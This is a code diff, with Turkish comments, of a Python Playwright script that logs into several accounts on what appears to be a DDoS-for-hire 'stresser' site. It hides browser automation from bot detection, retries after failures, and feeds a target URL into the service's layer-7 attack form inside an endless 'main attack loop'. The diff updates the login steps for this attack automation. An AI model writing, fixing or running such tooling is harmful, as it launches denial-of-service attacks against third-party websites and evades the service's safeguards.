@@ -17,13 +17,11 @@ def load_accounts():
             line = line.strip()
             if not line:
                 continue
-            # Önce kullanıcı ve şifreyi ayır
             parts = line.split(":", 2)
             if len(parts) < 3:
                 print(f"⚠️ Geçersiz satır: {line}")
                 continue
             user, pwd, rest = parts[0], parts[1], parts[2]
-            # rest içinde URL ve method'u son ':' ile ayır
             if ":" in rest:
                 url, method = rest.rsplit(":", 1)
             else:
@@ -64,14 +62,24 @@ def attack_worker(account):
                     Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                 """)
 
+                # ---------- GİRİŞ (GÜNCELLENDİ) ----------
                 print(f"[{username}] 🔐 Giriş yapılıyor...")
                 try:
                     page.goto("https://l7srv.cc/login", timeout=120000, wait_until="domcontentloaded")
                     page.wait_for_load_state("networkidle", timeout=60000)
                     time.sleep(2)
+
+                    # Kullanıcı adı ve şifreyi doldur
                     page.fill("#username", username)
                     page.fill("#password", password)
-                    page.click("button.btn-submit")
+
+                    # Butonun aktifleşmesini bekle (disabled kalkana kadar)
+                    page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=15000)
+
+                    # Butona tıkla
+                    page.click("#loginNextBtn")
+
+                    # Dashboard'a yönlenene kadar bekle
                     page.wait_for_url(lambda url: "/dash" in url, timeout=30000)
                     print(f"[{username}] ✅ Giriş başarılı.")
                     consecutive_errors = 0
@@ -82,6 +90,7 @@ def attack_worker(account):
                     time.sleep(10 if consecutive_errors < 3 else 60)
                     continue
 
+                # ---------- STRESS SAYFASI ----------
                 print(f"[{username}] 📡 Stress sayfası...")
                 try:
                     page.goto("https://l7srv.cc/dash/stress", timeout=120000, wait_until="domcontentloaded")
@@ -97,6 +106,7 @@ def attack_worker(account):
                     time.sleep(10 if consecutive_errors < 3 else 60)
                     continue
 
+                # ---------- ANA SALDIRI DÖNGÜSÜ ----------
                 while True:
                     try:
                         page.fill("#l7host", target_url, timeout=15000)
